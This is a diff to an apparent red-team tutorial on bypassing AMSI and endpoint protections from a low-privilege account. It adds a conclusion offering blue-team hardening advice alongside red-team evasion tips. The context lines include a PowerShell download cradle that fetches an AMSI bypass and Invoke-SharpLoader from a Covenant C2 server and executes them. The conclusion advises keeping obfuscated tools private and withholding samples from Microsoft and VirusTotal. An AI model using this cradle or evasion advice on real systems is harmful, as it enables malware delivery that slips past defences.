@@ -212,13 +212,14 @@ The whole attack is carried out on a low priv account.
 
     And host this file as well on our Covenant server under i.e. /Invoke-SharpLoader  
 
-4. Execute our Powershell load script 
+4. Execute our Powershell load script  
+    
     In the last step we put together a short script that we can call from our PowerShdll which looks like this:  
     ```
     iex(new-object net.webclient).downloadstring('http://10.55.0.30/amsibypass');
     iex(new-object net.webclient).downloadstring('http://10.55.0.30/Invoke-SharpLoader');
     ```
-    Remeber AMSI is still in place here, so we need to bypass it - even inside PowerShdll. Luckily for us, Invoke-Sharploader has a integrated C# and ETW bypass, so we just take care for the normal PowerShell AMSI bypass.  
+    Remeber AMSI is still in place here, so we need to bypass it - even inside PowerShdll. Luckily for us, Invoke-Sharploader has a integrated C# and ETW bypass, so we just take care for the normal PowerShell AMSI bypass beforehand.  
 
     Upload to our Covenant server under /init.  
 
@@ -232,3 +233,14 @@ The whole attack is carried out on a low priv account.
 
 ### Conclusion  
 
+We have seen that Blue Team has lots of possibilities to make an attackers life much harder.  
+Keep your security products up to date, and implement them correctly.  
+Make use of all the nice features that your OS or security product provider is offering you.  
+Play with the stuff you learned here to get a better understanding of your infrastructure and detect your weakpoints.  
+
+For the Red Team side I have shown you some of the ways to try to slip past these protection mechanisms.  
+Go ahead and start playing with them on your own.  
+Build yourself a **private** toolset with your obfuscated tools.  
+And last but not least: Don´t submit samples to Microsoft nor to VirusTotal if you want to use them on your next assessment.  
+
+That´s it for now folks. Hope you enjoyed and happy pentesting.
